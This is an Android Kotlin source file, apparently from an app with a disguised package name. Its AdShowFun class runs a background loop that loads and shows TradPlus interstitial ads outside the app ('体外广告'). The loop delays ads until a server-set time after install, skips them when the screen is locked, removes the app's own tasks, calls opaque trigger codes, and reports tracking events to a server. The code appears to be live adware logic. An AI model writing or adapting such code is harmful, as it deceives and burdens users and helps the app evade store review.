package com.bamboo.cane.shoes.horses.tool

import android.app.Activity
import android.os.Handler
import android.os.Looper
import android.util.Log
import com.bamboo.cane.shoes.horses.bmain.SwcTool
import com.bamboo.cane.shoes.horses.bmain.jian.GameInitializer.adLimiter
import com.bamboo.cane.shoes.horses.bmain.jian.GameStart
import com.bamboo.cane.shoes.horses.cnetwork.GameCanPost
import com.bamboo.cane.shoes.horses.contens.EnhancedShowService
import com.bamboo.cane.shoes.horses.contens.bean.DataConTentTool
import com.bamboo.cane.shoes.horses.contens.bean.SPUtils
import com.tradplus.ads.base.bean.TPAdError
import com.tradplus.ads.base.bean.TPAdInfo
import com.tradplus.ads.open.interstitial.InterstitialAdListener
import com.tradplus.ads.open.interstitial.TPInterstitial
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.MainScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.util.Arrays


class AdShowFun {
    private var jobAdRom: Job? = null

    // 广告对象
    var mTPInterstitial: TPInterstitial? = null

    // 广告缓存时间（单位：毫秒）
    private val AD_CACHE_DURATION = 50 * 60 * 1000L // 50分钟

    // 上次广告加载时间
    private var lastAdLoadTime: Long = 0

    // 是否正在加载广告
    private var isLoading = false
    var clickState = false
    var isHaveAdData = false
    private val scope = MainScope()
    private var loadTimeoutJob: Job? = null

    // 广告初始化，状态回调
    private fun intiTTTTAd() {
        if (mTPInterstitial == null) {
            val idBean = GameStart.getAdminData() ?: return
            mTPInterstitial = TPInterstitial(GameStart.gameApp, idBean.ad.identifiers.main)
            mTPInterstitial!!.setAdListener(object : InterstitialAdListener {
                override fun onAdLoaded(tpAdInfo: TPAdInfo) {
                    GameStart.showLog("体外广告加载成功")
                    lastAdLoadTime = System.currentTimeMillis()
                    GameCanPost.postPointDataWithCoroutine(false, "getadvertise")
                    isLoading = false
                    isHaveAdData = true
                }

                override fun onAdClicked(tpAdInfo: TPAdInfo) {
                    GameStart.showLog("体外广告${tpAdInfo.adSourceName}被点击")
                    adLimiter.recordAdClicked()
                    clickState = true
                }

                override fun onAdImpression(tpAdInfo: TPAdInfo) {
                    GameStart.showLog("体外广告${tpAdInfo.adSourceName}展示")
                    adLimiter.recordAdShown()
                    GameCanPost.postAdmobDataWithCoroutine(tpAdInfo)
                    GameCanPost.showsuccessPoint()
                    if (adLimiter.canShowAd() && mTPInterstitial?.isReady == true) {
                        lastAdLoadTime = System.currentTimeMillis()
                        isHaveAdData = true
                    } else {
                        lastAdLoadTime = 0
                        isHaveAdData = false
                    }
                }

                override fun onAdFailed(tpAdError: TPAdError) {
                    GameStart.showLog("体外广告加载失败")
                    isHaveAdData = false
                    CoroutineScope(Dispatchers.Main).launch {
                        delay(10000)
                        isLoading = false
                    }
                    GameCanPost.postPointDataWithCoroutine(
                        false,
                        "getfail",
                        "string1",
                        tpAdError.errorMsg
                    )
                }

                override fun onAdClosed(tpAdInfo: TPAdInfo) {
                    GameStart.showLog("体外广告${tpAdInfo.adSourceName}被关闭")
                    closeAllActivities()
                }

                override fun onAdVideoError(tpAdInfo: TPAdInfo, tpAdError: TPAdError) {
                    AdUtils.adShowTime = 0
                    GameStart.showLog("体外广告${tpAdInfo.adSourceName}展示失败")
                    GameCanPost.postPointDataWithCoroutine(
                        false,
                        "showfailer",
                        "string3",
                        tpAdError.errorMsg
                    )
                }

                override fun onAdVideoStart(tpAdInfo: TPAdInfo) {

                }

                override fun onAdVideoEnd(tpAdInfo: TPAdInfo) {
                }
            })
        }
    }

    // 加载广告方法
    private fun loadAd() {
        if (!adLimiter.canShowAd()) {
            GameStart.showLog("体外广告展示限制,不加载广告")
            return
        }
        val currentTime = System.currentTimeMillis()
        if (mTPInterstitial != null && isHaveAdData && (currentTime - lastAdLoadTime) < AD_CACHE_DURATION) {
            // 使用缓存的广告
            GameStart.showLog("不加载,有缓存的广告")
            // 处理广告展示的逻辑
        } else {
            // 如果正在加载广告，则不发起新的请求
            if (isLoading) {
                GameStart.showLog("正在加载广告，等待加载完成")
                return
            }
            // 设置正在加载标志
            isLoading = true
            // 发起新的广告请求
            GameStart.showLog("发起新的广告请求")
            mTPInterstitial?.loadAd()
            GameCanPost.postPointDataWithCoroutine(false, "reqadvertise")

            // 设置超时处理
            loadTimeoutJob?.cancel()
            loadTimeoutJob = scope.launch(Dispatchers.Main) {
                delay(60_000) // 延迟 60 秒

                if (isLoading && !isHaveAdData) {
                    GameStart.showLog("广告加载超时，重新请求广告")
                    isLoading = false
                    lastAdLoadTime = 0
                    loadAd()
                }
            }
        }
    }

    fun startRomFun() {
        intiTTTTAd()
        if (AdUtils.adNumAndPoint()) {
            return
        }
        jobAdRom = CoroutineScope(Dispatchers.Main).launch {
            SwcTool.swcTool(33453)
            checkAndShowAd()
        }
    }

    private suspend fun checkAndShowAd() {
        val adminData = GameStart.getAdminData() ?: return
        val wTime = adminData.ad.timing.scanInterval
        val delayData = wTime.toLong().times(1000L)
        GameStart.showLog("doToWhileAd delayData=: ${delayData}")
        while (true) {
            GameStart.showLog("循环检测广告")
            GameCanPost.postPointDataWithCoroutine(false, "timertask")
            if (AdUtils.adNumAndPoint()) {
                if (!SPUtils.getBoolean(DataConTentTool.adFailPost)) {
                    GameCanPost.postPointDataWithCoroutine(true, "jumpfail")
                    SPUtils[DataConTentTool.adFailPost] = true
                }
                jobAdRom?.cancel()
                return
            }
            loadAd()
            isHaveAdNextFun()
            delay(delayData)
        }
    }

    private fun isHaveAdNextFun() {
        // 检查锁屏或息屏状态，避免过多的嵌套
        if (AdUtils.canShowLocked()) {
            GameStart.showLog("锁屏或者息屏状态，广告不展示")
            return
        }
        // 调用点位数据函数
        GameCanPost.postPointDataWithCoroutine(false, "isunlock")

        // 获取管理员数据
        val jsonBean = GameStart.getAdminData() ?: return

        // 获取安装时间
        val instalTime = EnhancedShowService.getInstallTimeInSeconds()
        val wait = jsonBean.ad.timing.showIntervalTime
        val ins = jsonBean.ad.timing.installTime
        // 检查首次安装时间和广告展示时间间隔
        if (isBeforeInstallTime(instalTime, ins)) return
        if (isAdDisplayIntervalTooShort(wait)) return
        // 检查广告展示限制
        if (!adLimiter.canShowAd(true)) {
            GameStart.showLog("体外广告展示限制")
            return
        }
        val activities = GameStart.activityList.isEmpty()
        val state = isAllActivitiesInWhitelist()
        if (GameStart.adShowFun.mTPInterstitial?.isReady == true || activities || state) {
            GameStart.showLog("体外流程")
            showAdAndTrack()
        }
    }

    private fun isBeforeInstallTime(instalTime: Long, ins: Int): Boolean {
        if (instalTime < ins) {
            GameStart.showLog("距离首次安装时间小于$ins 秒，广告不能展示")
            GameCanPost.postPointDataWithCoroutine(false, "ispass", "string", "Install")
            return true
        }
        return false
    }

    private fun isAdDisplayIntervalTooShort(wait: Int): Boolean {
        val jiange = (System.currentTimeMillis() - AdUtils.adShowTime) / 1000
        if (jiange < wait) {
            GameStart.showLog("广告展示间隔时间小于$wait 秒，不展示")
            GameCanPost.postPointDataWithCoroutine(false, "ispass", "string", "interval")
            return true
        }
        return false
    }

    private fun showAdAndTrack() {
        GameCanPost.postPointDataWithCoroutine(false, "ispass", "string", "")
        CoroutineScope(Dispatchers.Main).launch {
            closeAllActivities()
            delay(1011)
            var adNum = SPUtils.getInt(DataConTentTool.isAdFailCount)
            adNum++
            SPUtils.putInt(DataConTentTool.isAdFailCount, adNum)

            SwcTool.swcTool(12234)
            GameCanPost.postPointDataWithCoroutine(false, "callstart")
        }
    }

    fun closeAllActivities() {
        GameStart.showLog("closeAllActivities")
        for (activity in GameStart.activityList) {
            activity.finishAndRemoveTask()
        }
        GameStart.activityList.clear()
    }

    private fun isAllActivitiesInWhitelist(): Boolean {
        // 定义白名单集合
        val whitelist = setOf(
            "com.bamboo.cane.shoes.horses.xac.XzShowActivity",
            "com.show.biker.fasten.MainActivity"
        )
        // 遍历检查所有 Activity
        for (activity in GameStart.activityList) {
            val className = activity.javaClass.name
            if (className.isEmpty()) continue // 跳过空类名
            if (className !in whitelist) {
                GameStart.showLog("当前广告正在显示：$className")
                return false // 存在不在白名单中的类
            }
        }
        return true // 所有类均合法
    }
}